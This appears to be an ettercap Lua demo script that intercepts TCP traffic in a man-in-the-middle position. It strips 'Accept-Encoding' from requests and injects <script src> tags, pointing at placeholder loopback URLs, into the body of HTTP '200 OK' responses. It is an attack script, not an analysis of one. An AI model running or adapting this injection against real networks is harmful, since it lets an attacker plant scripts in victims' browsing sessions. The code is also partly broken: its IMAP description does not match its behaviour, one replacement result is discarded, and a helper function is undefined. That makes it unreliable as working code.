description = "This is a test script to gather imap data";

require 'os'
local ffi = require('ettercap_ffi')
local hook_points = require("hook_points")
local shortpacket = require("shortpacket")
local shortsession = require("shortsession")
local packet = require("packet")

-- We have to hook at the filtering point so that we are certain that all the 
-- dissectors hae run.
hook_point = hook_points.filter
local function htons(x)
	if LITTLE_ENDIAN then
		return bit.bor(
			bit.rshift( x, 8 ),
			bit.band( bit.lshift( x, 8 ), 0xFF00 )
		)
	else
		return x
	end
end
-- We only want to match packets that look like HTTP responses.
packetrule = function(packet_object)
  if packet.is_tcp(packet_object) == false then
    return false
  end

  ettercap.log("Got a packet destined for %s %s : %s\n",
		 packet.src_ip(packet_object), 
		 ffi.C.ntohs(packet_object.L4.dst), 
		 ffi.C.ntohs(packet_object.L4.src))
  --ettercap.log("Got a packet destined for " .. packet.src_ip(packet_object) .. "," .. tostring(packet_object.L4.dst) .."," .. tostring(packet_object.L4.src) .. "\n")
  if packet_object.L4.dst == 1143 then
	ettercap.log("We got a live one..\n")
	return true
  end
  ettercap.log("failed..\n")
  -- Check to see if it starts with the right stuff.
  return false
end


local session_key_func = shortsession.tcp_session("http_inject_demo")
local create_namespace = ettercap.reg.create_namespace



-- Here's your action.
action = function(po) 
  local session_id = session_key_func(po)
  local session_data = create_namespace(session_id)

  local urls = { 'http://127.0.0.1',
		 'http://127.0.0.2',
		 'http://127.0.0.3'}

  if not session_id then
    -- If we don't have session_id, then bail.
    return nil
  end
  --local src_ip = ""
  --local dst_ip = ""
  local src_ip = packet.src_ip(po)
  local dst_ip = packet.dst_ip(po)
  
  -- ettercap.log("inject_4ttp: " .. src_ip .. " -> " .. dst_ip .. "\n")
  -- Get the full buffer....
  local buf = packet.read_data(po)
  if string.match(buf,'Accept.Encoding') then
	string.gsub(buf, 'Accept-Encoding', "Xccept-Encoding", 1)
	ettercap.log(buf)
        packet.set_data(po, buf)
	return nil
  end
  if not(string.match(buf,"200 OK")) then
	return nil
  end
  -- Split the header/body up so we can manipulate things.
  local start,finish,header, body = split_http(buf)
  -- local start,finish,header,body = string.find(buf, '(.-\r?\n\r?\n)(.*)')
  if not session_data.count  then
	session_data.count = 0	
	session_data.time = 0
  end
  
  -- If 5 seonds have passed, incriment count
  if os.time() - session_data.time > 5 then
  	session_data.count = session_data.count + 1
	session_data.time  = os.time()
  end
  
	
  if (not (start == nil)) then
    -- We've got a proper split.
    local orig_body_len = string.len(body)

    -- URL will vary based on count, but if it doesn't exist, we're done
    local url = urls[session_data.count]
    if url == nil then
	return nil
    end

    local modified_body = string.gsub(body, '<[bB][oO][dD][yY]>','<body><script src="' .. url .. '"></script>')

    -- We've tweaked things, so let's update the data.
    --if (not(modified_body == body)) then
      --local modified_data = ""
      --local content_length = string.match(header, "Content.Length:.(%d+).")
      --if content_length then
 	--ettercap.log("Found a content length of " .. tostring(content_length) .. "\n")
      	--content_length = content_length + (string.len(modified_body) - orig_body_len)
      	--local modified_header = string.gsub(header, "Content.Length: %d+", "Content-Length: " .. tostring(content_length) .. "\n")
      	 --modified_data = modified_header .. modified_body
	 --ettercap.log(modified_data)
      --else
      	local modified_data = header .. modified_body
      --end

      -- This takes care of setting the packet data, as well as flagging it 
      -- as modified.
      ettercap.log(modified_data)
      packet.set_data(po, modified_data)
    --end
  end
end
